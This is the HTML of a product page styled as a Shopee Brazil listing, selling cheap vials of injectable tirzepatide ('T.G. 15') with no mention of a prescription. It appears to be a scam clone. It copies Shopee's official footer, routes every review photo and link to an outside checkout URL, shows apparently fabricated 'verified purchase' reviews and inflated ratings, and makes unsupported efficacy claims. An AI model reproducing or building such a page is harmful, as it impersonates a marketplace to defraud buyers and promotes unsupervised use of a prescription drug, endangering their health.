    <!-- Specifications Row -->
    <section class="shopee-card shopee-specs-card">
        <div class="shopee-spec-header" id="specsToggle">
            <span class="shopee-spec-title">Especificação do Produto</span>
            <span class="shopee-spec-summary">Substância, Dosagem &gt;</span>
        </div>
        <div class="shopee-spec-body" id="specsBody">
            <div class="shopee-spec-row">
                <span class="spec-label">Marca</span>
                <span class="spec-value">T.G.</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Produto</span>
                <span class="spec-value">T.G. 15</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Princípio Ativo</span>
                <span class="spec-value">Tirzepatida</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Concentração</span>
                <span class="spec-value">15 mg / 0,5 mL (Dose máxima de alta potência)</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Apresentação</span>
                <span class="spec-value">Solução estéril injetável em frascos individuais</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Via de Aplicação</span>
                <span class="spec-value">Subcutânea (1 aplicação semanal de 10 segundos)</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Conservação</span>
                <span class="spec-value">Entre 2 °C e 8 °C; não congelar; proteger da luz</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Rastreabilidade</span>
                <span class="spec-value">QR Code único e individual por frasco · LOTE TG-2026-15MG</span>
            </div>
            <div class="shopee-spec-row">
                <span class="spec-label">Envio</span>
                <span class="spec-value">Caixa térmica refrigerada com gelo eutético lacrada</span>
            </div>
        </div>
    </section>

    <!-- Description & FAQ Section -->
    <section class="shopee-card shopee-desc-card">
        <h2 class="shopee-section-title">Descrição do Produto</h2>
        <div class="shopee-desc-text" id="descText">
            <p><strong>🔹 T.G. 15 · Tirzepatida 15 mg/0,5 mL Original</strong></p>
            <p>O T.G. 15 é formulado com Tirzepatida pura de alta estabilidade na concentração máxima de 15 mg por 0,5 mL. Desenvolvido para atuar diretamente nos receptores GLP-1 e GIP, promovendo saciedade precoce, controle glicêmico e desaceleração do esvaziamento gástrico.</p>
            
            <p><strong>Por que escolher o T.G. 15?</strong></p>
            <ul style="padding-left: 20px; line-height: 1.6; margin-bottom: 12px;">
                <li><strong>Dose Máxima 15 mg:</strong> Eficácia comprovada para resultados consistentes semana após semana.</li>
                <li><strong>Aplicação Prática:</strong> Apenas 1 aplicação subcutânea por semana (leva menos de 10 segundos).</li>
                <li><strong>QR Code de Autenticidade:</strong> Cada embalagem possui código individual para conferência de procedência no sistema oficial.</li>
                <li><strong>Cadeia de Frio Garantida:</strong> Sai do centro de distribuição em caixa de isopor térmica de parede dupla com gelo especializado (2 °C a 8 °C).</li>
                <li><strong>Garantia de Entrega Perfeita:</strong> Não chegou gelado? Devolvemos 100% do seu dinheiro na hora.</li>
            </ul>

            <p><strong>Perguntas Frequentes:</strong></p>
            <div class="shopee-faq-item">
                <div class="shopee-faq-q" onclick="this.nextElementSibling.classList.toggle('open');">
                    <span>Como o meu T.G. 15 chega até mim?</span>
                    <span>∨</span>
                </div>
                <div class="shopee-faq-a open">
                    O pedido sai refrigerado com bolsas de gel térmico, mantendo a temperatura de 2 °C a 8 °C durante todo o transporte. A caixa vai lacrada e você confere lote, validade e selo de segurança ao receber.
                </div>
            </div>
            <div class="shopee-faq-item">
                <div class="shopee-faq-q" onclick="this.nextElementSibling.classList.toggle('open');">
                    <span>E se chegar fora da temperatura?</span>
                    <span>∨</span>
                </div>
                <div class="shopee-faq-a">
                    Se o pedido chegar fora da faixa de conservação, basta entrar em contato no mesmo dia que efetuamos o estorno imediato do valor total.
                </div>
            </div>
            <div class="shopee-faq-item">
                <div class="shopee-faq-q" onclick="this.nextElementSibling.classList.toggle('open');">
                    <span>Quanto de T.G. 15 eu posso levar?</span>
                    <span>∨</span>
                </div>
                <div class="shopee-faq-a">
                    Você pode escolher 1 frasco (R$ 97), 2 frascos (R$ 147) ou o Kit Completo com 4 frascos (R$ 197), saindo por menos de R$ 50 cada frasco.
                </div>
            </div>
        </div>
        <button type="button" class="shopee-expand-btn" id="descExpandBtn">
            Ver Mais <span class="arrow-indicator">∨</span>
        </button>
    </section>

    <!-- Customer Reviews Section (AVALIAÇÕES REAIS COM FOTOS IMPORTADAS DO PRODUTO) -->
    <section class="shopee-card shopee-reviews-card">
        <div class="shopee-reviews-header">
            <div>
                <h2 class="shopee-section-title" style="margin: 0; display: inline-block;">Avaliações do produto</h2>
            </div>
            <a href="javascript:void(0)" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)" class="shopee-see-all">Ver tudo &gt;</a>
        </div>
        <div class="shopee-reviews-stars">
            <span class="stars-gold">★★★★★</span>
            <span class="score-text">4.9/5</span>
            <span class="reviews-count">(9.231 Resenhas)</span>
        </div>
        <div class="shopee-review-chips">
            <span class="shopee-chip" style="background:#ee4d2d;color:#fff;font-weight:700;">Tudo (9.2k)</span>
            <span class="shopee-chip">Com fotos (4.8k)</span>
            <span class="shopee-chip">5 Estrelas (8.9k)</span>
            <span class="shopee-chip">4 Estrelas (280)</span>
        </div>

        <!-- Review 1: Mariana Santos (Foto Holograma UV) -->
        <div class="shopee-review-item">
            <div class="review-author-row">
                <div class="review-avatar-placeholder">
                    <img class="review-avatar" src="images/blank-profile-picture-973460_640-150x150.webp" alt="Mariana Santos">
                </div>
                <div class="review-author-info">
                    <span class="review-username">
                        Mariana Santos
                        <svg viewBox="0 0 24 24" width="12" height="12" fill="#26aa99"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    </span>
                    <div class="stars-gold-small">★★★★★</div>
                </div>
                <div class="review-actions">
                    <span class="review-util">Útil (24)</span>
                    <span class="review-dots">···</span>
                </div>
            </div>
            <div class="review-variation-tag">Variação: Caixa com 4 frascos (Kit completo)</div>
            <div class="review-body">
                Chegou super gelado dentro da caixa térmica com gelo gel! Conferi o holograma na luz UV e o QR code bateu certinho no lote original do laboratório. Já perdi 4,2 kg nas primeiras 3 semanas sem passar fome nenhuma. Podem comprar sem medo!
            </div>
            <div class="review-photos-grid">
                <img src="images/feedback-tg-holograma.jpeg" alt="Holograma sob luz UV T.G. 15" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            </div>
            <div class="review-date-text">Hoje 14:22 | Compra verificada</div>
        </div>

        <!-- Review 2: Carlos Eduardo M. (Caixa aberta e frascos) -->
        <div class="shopee-review-item">
            <div class="review-author-row">
                <div class="review-avatar-placeholder">
                    <img class="review-avatar" src="images/blank-profile-picture-973460_640-150x150.webp" alt="Carlos Eduardo M.">
                </div>
                <div class="review-author-info">
                    <span class="review-username">
                        Carlos Eduardo M.
                        <svg viewBox="0 0 24 24" width="12" height="12" fill="#26aa99"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    </span>
                    <div class="stars-gold-small">★★★★★</div>
                </div>
                <div class="review-actions">
                    <span class="review-util">Útil (18)</span>
                    <span class="review-dots">···</span>
                </div>
            </div>
            <div class="review-variation-tag">Variação: Caixa com 4 frascos (Kit completo)</div>
            <div class="review-body">
                Peguei o kit com 4 frascos pelo custo benefício, sai menos de R$ 50 cada frasco. Embalagem lacrada, frascos intactos, código de rastreio funcionando desde o primeiro dia. Chegou em 3 dias aqui no RJ.
            </div>
            <div class="review-photos-grid">
                <img src="images/tg-feedback-2.webp" alt="Caixa aberta e frascos T.G. 15" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            </div>
            <div class="review-date-text">Ontem 18:05 | Compra verificada</div>
        </div>

        <!-- Review 3: Renata Fernandes (Caixa térmica e gelo) -->
        <div class="shopee-review-item">
            <div class="review-author-row">
                <div class="review-avatar-placeholder">
                    <img class="review-avatar" src="images/blank-profile-picture-973460_640-150x150.webp" alt="Renata Fernandes">
                </div>
                <div class="review-author-info">
                    <span class="review-username">
                        Renata Fernandes
                        <svg viewBox="0 0 24 24" width="12" height="12" fill="#26aa99"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    </span>
                    <div class="stars-gold-small">★★★★★</div>
                </div>
                <div class="review-actions">
                    <span class="review-util">Útil (15)</span>
                    <span class="review-dots">···</span>
                </div>
            </div>
            <div class="review-variation-tag">Variação: 2 frascos</div>
            <div class="review-body">
                Minha maior preocupação era o transporte por causa do calor, mas a caixa veio muito bem isolada com o gelo ainda durinho! Atendimento impecável no suporte também. Nota 10 pro cuidado da loja.
            </div>
            <div class="review-photos-grid">
                <img src="images/tg-feedback-3.webp" alt="Caixa com gelo protetor T.G. 15" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            </div>
            <div class="review-date-text">Há 2 dias | Compra verificada</div>
        </div>

        <!-- Review 4: Juliana Prado (QR Code e conservação) -->
        <div class="shopee-review-item">
            <div class="review-author-row">
                <div class="review-avatar-placeholder">
                    <img class="review-avatar" src="images/blank-profile-picture-973460_640-150x150.webp" alt="Juliana Prado">
                </div>
                <div class="review-author-info">
                    <span class="review-username">
                        Juliana Prado
                        <svg viewBox="0 0 24 24" width="12" height="12" fill="#26aa99"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    </span>
                    <div class="stars-gold-small">★★★★★</div>
                </div>
                <div class="review-actions">
                    <span class="review-util">Útil (11)</span>
                    <span class="review-dots">···</span>
                </div>
            </div>
            <div class="review-variation-tag">Variação: 1 frasco</div>
            <div class="review-body">
                Produto 100% autêntico. Escaneei o QR code da lateral e conferi as informações de lote e validade na hora. Aplicação super simples e rápida, zero dor. Já vou encomendar o kit de 4 frascos agora.
            </div>
            <div class="review-photos-grid">
                <img src="images/tg-feedback-4.webp" alt="Lateral QR Code T.G. 15" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            </div>
            <div class="review-date-text">Há 3 dias | Compra verificada</div>
        </div>

        <!-- Review 5: Rodrigo Albuquerque -->
        <div class="shopee-review-item">
            <div class="review-author-row">
                <div class="review-avatar-placeholder">
                    <img class="review-avatar" src="images/blank-profile-picture-973460_640-150x150.webp" alt="Rodrigo Albuquerque">
                </div>
                <div class="review-author-info">
                    <span class="review-username">
                        Rodrigo Albuquerque
                        <svg viewBox="0 0 24 24" width="12" height="12" fill="#26aa99"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    </span>
                    <div class="stars-gold-small">★★★★★</div>
                </div>
                <div class="review-actions">
                    <span class="review-util">Útil (9)</span>
                    <span class="review-dots">···</span>
                </div>
            </div>
            <div class="review-variation-tag">Variação: Caixa com 4 frascos (Kit completo)</div>
            <div class="review-body">
                Excelente! Segunda vez que compro nessa loja. Entrega rápida e o produto realmente funciona como esperado. Sensação de saciedade absurda desde os primeiros dias.
            </div>
            <div class="review-photos-grid">
                <img src="images/tg15-frasco.webp" alt="Frasco T.G. 15" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            </div>
            <div class="review-date-text">Há 4 dias | Compra verificada</div>
        </div>
    </section>

    <!-- OFFICIAL ORIGINAL SHOPEE SYSTEM FOOTER -->
    <footer class="Dtu9HW"><!--$--><div></div><!--/$--><div class="bE7OGq"><!--$--><!--$--><div><div class="mUnW9g"><div class="_87kPP"><div class="WgSr6D"><div class="JlKgZM">ATENDIMENTO AO CLIENTE</div><ul class="tYFPu_"><li class="wdBnpK"><a href="https://help.shopee.com.br/portal" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Central de Ajuda</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/article/76401-[No%c3%a7%c3%b5es-b%c3%a1sicas-do-comprador]-Como-fa%c3%a7o-uma-compra-na-Shopee%3F" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Como Comprar</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/article/76237-[Novo-na-Shopee]-Quais-op%c3%a7%c3%b5es-de-pagamento-s%c3%a3o-aceitas-pela-Shopee%3F" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Métodos de Pagamento</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/article/76327-[Seguran%c3%a7a-do-pedido]-O-que-%c3%a9-a-Garantia-Shopee%3F" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Garantia Shopee</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/category/68-Retorno-Reembolso/579-Solicitando-um-Reembolso?page=1" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Devolução e Reembolso</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/article/78354-[Atendimento-ao-Cliente]-Como-entro-em-contato-com-o-Atendimento-ao-Cliente-da-Shopee" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Fale Conosco</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/article/76290-[Ouvidoria]-Como-abrir-uma-solicita%c3%a7%c3%a3o-para-a-ouvidoria%3F" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Ouvidoria</span></a></li><li class="wdBnpK"><a href="https://shopee.com.br/setting/cookie" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Preferências de cookies</span></a></li></ul></div><div class="WgSr6D"><div class="JlKgZM">SOBRE A SHOPEE</div><ul class="tYFPu_"><li class="wdBnpK"><a href="https://shopee.com.br/blog/sobre-nos/" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Sobre Nós</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/4/category/17558-Pol%C3%ADticas/17562-Pol%C3%ADticas-da-Shopee?page=1" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Políticas</span></a></li><li class="wdBnpK"><a href="https://shopee.com.br/blog/relatorio-de-transparencia-eca-digital/" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Relatórios</span></a></li><li class="wdBnpK"><a href="https://help.shopee.com.br/portal/article/77068" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Política de Privacidade da Shopee</span></a></li><li class="wdBnpK"><a href="https://shopee.com.br/m/afiliados" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Programa de Afiliados da Shopee</span></a></li><li class="wdBnpK"><a href="https://spx.com.br/br/driver/seja-um-motorista-parceiro.html" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Seja um Motorista Parceiro Shopee</span></a></li><li class="wdBnpK"><a href="https://shopee.com.br/flash_sale" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Ofertas Relâmpago</span></a></li><li class="wdBnpK"><a href="https://shopee.com.br/blog" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Shopee Blog</span></a></li><li class="wdBnpK"><a href="https://shopee.com.br/m/imprensa" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Imprensa</span></a></li><li class="wdBnpK"><a href="https://careers.shopee.com.br/" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Carreiras</span></a></li></ul><div class="JlKgZM PoE0oU">Black Friday</div><ul class="tYFPu_"><li class="wdBnpK"><a href="https://shopee.com.br/m/black-friday" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><span class="Uh8ZGt">Black Friday 2026</span></a></li></ul></div><div class="WgSr6D"><div class="JlKgZM">PAGAMENTO</div><ul class="n9X8as"><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/a65c5d1c5e556c6197f8fbd607482372.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/a65c5d1c5e556c6197f8fbd607482372" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/95d849253f75d5e6e6b867af4f7c65aa.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/95d849253f75d5e6e6b867af4f7c65aa" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/br-11134258-7r98o-lxsovyseln7jc5.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/br-11134258-7r98o-lxsovyseln7jc5" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/285e5ab6207eb562a9e893a42ff7ee46.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/285e5ab6207eb562a9e893a42ff7ee46" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/44734b7fc343eb46237c2d90c6c9ca60.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/44734b7fc343eb46237c2d90c6c9ca60" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/2a2cfeb34b00ef7b3be23ea516dcd1c5.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/2a2cfeb34b00ef7b3be23ea516dcd1c5" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/br-11134258-81z1k-mhjictkscc1t48.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/br-11134258-81z1k-mhjictkscc1t48" alt="logo"></picture></a></li><li class="Ei2TcA"><a targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="HOyEnn"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/br-11134258-820le-mrkbg2lu0suc01.webp" type="image/webp" class="LUML4T"><img loading="lazy" class="sWMiDt lazyload" srcset="" src="https://down-br.img.susercontent.com/file/br-11134258-820le-mrkbg2lu0suc01" alt="logo"></picture></a></li></ul></div><div class="WgSr6D"><div class="JlKgZM">SIGA-NOS</div><ul class="tYFPu_"><li class="wdBnpK"><a href="https://instagram.com/Shopee_BR" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/aed1aaab6a81b4347b440d981f0cf76f@resize_w16_nl.webp 1x, https://down-br.img.susercontent.com/file/aed1aaab6a81b4347b440d981f0cf76f@resize_w32_nl.webp 2x" type="image/webp" class="LUML4T"><img width="16" loading="lazy" class="sWMiDt lazyload AlFaz4" srcset="https://down-br.img.susercontent.com/file/aed1aaab6a81b4347b440d981f0cf76f@resize_w16_nl 1x, https://down-br.img.susercontent.com/file/aed1aaab6a81b4347b440d981f0cf76f@resize_w32_nl 2x" src="https://down-br.img.susercontent.com/file/aed1aaab6a81b4347b440d981f0cf76f" height="16" alt=""></picture><span class="Uh8ZGt">Instagram</span></a></li><li class="wdBnpK"><a href="https://www.tiktok.com/@shopee_br" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/531a1a0e62d0f9875a56390970e5a845@resize_w16_nl.webp 1x, https://down-br.img.susercontent.com/file/531a1a0e62d0f9875a56390970e5a845@resize_w32_nl.webp 2x" type="image/webp" class="LUML4T"><img width="16" loading="lazy" class="sWMiDt lazyload AlFaz4" srcset="https://down-br.img.susercontent.com/file/531a1a0e62d0f9875a56390970e5a845@resize_w16_nl 1x, https://down-br.img.susercontent.com/file/531a1a0e62d0f9875a56390970e5a845@resize_w32_nl 2x" src="https://down-br.img.susercontent.com/file/531a1a0e62d0f9875a56390970e5a845" height="16" alt=""></picture><span class="Uh8ZGt">TikTok</span></a></li><li class="wdBnpK"><a href="https://whatsapp.com/channel/0029VaKEnKI6GcGLZwn7l103" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/br-11134258-7r98o-m9rsxkghyiv667@resize_w16_nl.webp 1x, https://down-br.img.susercontent.com/file/br-11134258-7r98o-m9rsxkghyiv667@resize_w32_nl.webp 2x" type="image/webp" class="LUML4T"><img width="16" loading="lazy" class="sWMiDt lazyload AlFaz4" srcset="https://down-br.img.susercontent.com/file/br-11134258-7r98o-m9rsxkghyiv667@resize_w16_nl 1x, https://down-br.img.susercontent.com/file/br-11134258-7r98o-m9rsxkghyiv667@resize_w32_nl 2x" src="https://down-br.img.susercontent.com/file/br-11134258-7r98o-m9rsxkghyiv667" height="16" alt=""></picture><span class="Uh8ZGt">Whatsapp</span></a></li><li class="wdBnpK"><a href="https://facebook.com/ShopeeBR" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/33b3213444ab1fa40c1eb7abf8b91b11@resize_w16_nl.webp 1x, https://down-br.img.susercontent.com/file/33b3213444ab1fa40c1eb7abf8b91b11@resize_w32_nl.webp 2x" type="image/webp" class="LUML4T"><img width="16" loading="lazy" class="sWMiDt lazyload AlFaz4" srcset="https://down-br.img.susercontent.com/file/33b3213444ab1fa40c1eb7abf8b91b11@resize_w16_nl 1x, https://down-br.img.susercontent.com/file/33b3213444ab1fa40c1eb7abf8b91b11@resize_w32_nl 2x" src="https://down-br.img.susercontent.com/file/33b3213444ab1fa40c1eb7abf8b91b11@resize_w32_nl 2x" src="https://down-br.img.susercontent.com/file/33b3213444ab1fa40c1eb7abf8b91b11" height="16" alt=""></picture><span class="Uh8ZGt">Facebook</span></a></li><li class="wdBnpK"><a href="https://linkedin.com/company/shopee" targettype="FooterItem" trackingdata="[object Object]" class="yIJgtJ" title="" target="_blank" rel="noopener noreferrer"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/ddf4fb18c6fa5e2d73459a7a7ea0953b@resize_w16_nl.webp 1x, https://down-br.img.susercontent.com/file/ddf4fb18c6fa5e2d73459a7a7ea0953b@resize_w32_nl.webp 2x" type="image/webp" class="LUML4T"><img width="16" loading="lazy" class="sWMiDt lazyload AlFaz4" srcset="https://down-br.img.susercontent.com/file/ddf4fb18c6fa5e2d73459a7a7ea0953b@resize_w16_nl 1x, https://down-br.img.susercontent.com/file/ddf4fb18c6fa5e2d73459a7a7ea0953b@resize_w32_nl 2x" src="https://down-br.img.susercontent.com/file/ddf4fb18c6fa5e2d73459a7a7ea0953b" height="16" alt=""></picture><span class="Uh8ZGt">LinkedIn</span></a></li></ul></div><div class="WgSr6D"><div class="JlKgZM">BAIXAR APP SHOPEE</div><div class="DLMbEy"><a href="https://shopee.com.br/web" targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/27788e45f5489f39ef1e774e9bbedb6f@resize_w80_nl.webp 1x, https://down-br.img.susercontent.com/file/27788e45f5489f39ef1e774e9bbedb6f@resize_w160_nl.webp 2x" type="image/webp" class="LUML4T"><img width="80" loading="lazy" class="sWMiDt lazyload Wn14IO" srcset="https://down-br.img.susercontent.com/file/27788e45f5489f39ef1e774e9bbedb6f@resize_w80_nl 1x, https://down-br.img.susercontent.com/file/27788e45f5489f39ef1e774e9bbedb6f@resize_w160_nl 2x" src="https://down-br.img.susercontent.com/file/27788e45f5489f39ef1e774e9bbedb6f" height="80" alt="download_qr_code"></picture></a><div class="uJiWCw"><a href="https://shopee.com.br/web" targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="FP4VvO"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/2c0f5bda4ce39caff001e7ccec309bc6@resize_w68_nl.webp 1x, https://down-br.img.susercontent.com/file/2c0f5bda4ce39caff001e7ccec309bc6@resize_w136_nl.webp 2x" type="image/webp" class="LUML4T"><img width="68" loading="lazy" class="sWMiDt lazyload" srcset="https://down-br.img.susercontent.com/file/2c0f5bda4ce39caff001e7ccec309bc6@resize_w68_nl 1x, https://down-br.img.susercontent.com/file/2c0f5bda4ce39caff001e7ccec309bc6@resize_w136_nl 2x" src="https://down-br.img.susercontent.com/file/2c0f5bda4ce39caff001e7ccec309bc6" height="16" alt="app"></picture></a><a href="https://shopee.com.br/web" targettype="FooterItem" trackingdata="[object Object]" target="_blank" rel="noopener noreferrer" class="FP4VvO"><picture class="LUML4T"><source srcset="https://down-br.img.susercontent.com/file/3b43f8cafbf943868154166639011597@resize_w68_nl.webp 1x, https://down-br.img.susercontent.com/file/3b43f8cafbf943868154166639011597@resize_w136_nl.webp 2x" type="image/webp" class="LUML4T"><img width="68" loading="lazy" class="sWMiDt lazyload" srcset="https://down-br.img.susercontent.com/file/3b43f8cafbf943868154166639011597@resize_w68_nl 1x, https://down-br.img.susercontent.com/file/3b43f8cafbf943868154166639011597@resize_w136_nl 2x" src="https://down-br.img.susercontent.com/file/3b43f8cafbf943868154166639011597" height="16" alt="app"></picture></a></div></div></div></div><div class="URvGxz"><div class="Pc3d01 fPod4n">© 2026 Shopee. Todos os direitos reservados</div><div class="hLS7q8"><div class="whkXnv fPod4n">País e região:</div><div class="FvfvFP"><a href="https://shopee.com.ar" class="fPod4n _nqc9j">Argentina</a></div><div class="FvfvFP"><a href="https://shopee.sg" class="fPod4n _nqc9j">Singapura</a></div><div class="FvfvFP"><a href="https://shopee.co.id" class="fPod4n _nqc9j">Indonésia</a></div><div class="FvfvFP"><a href="https://shopee.co.th" class="fPod4n _nqc9j">Tailândia</a></div><div class="FvfvFP"><a href="https://shopee.com.my" class="fPod4n _nqc9j">Malásia</a></div><div class="FvfvFP"><a href="https://shopee.vn" class="fPod4n _nqc9j">Vietnã</a></div><div class="FvfvFP"><a href="https://shopee.ph" class="fPod4n _nqc9j">Filipinas</a></div><div class="FvfvFP"><a href="https://shopee.com.br" class="fPod4n _nqc9j">Brasil</a></div><div class="FvfvFP"><a href="https://shopee.com.mx" class="fPod4n _nqc9j">México</a></div><div class="FvfvFP"><a href="https://shopee.tw" class="fPod4n _nqc9j">Taiwan</a></div></div></div></div><div class="YBNMTj"><div class="XFTguI">CNPJ/MF nº 35.635.824/0001-12. Endereço: Av. Brigadeiro Faria Lima, 3732 - 22º e 23º andares, Itaim Bibi, São Paulo (SP), Brasil, 04538-132</div></div></div><!--/$--><!--/$--></div></footer>
</div> <!-- /#main -->

<!-- Floating Scroll-To-Top Button -->
<button type="button" class="shopee-scroll-top-btn" id="scrollTopBtn" aria-label="Voltar ao topo">
    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#ee4d2d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
</button>

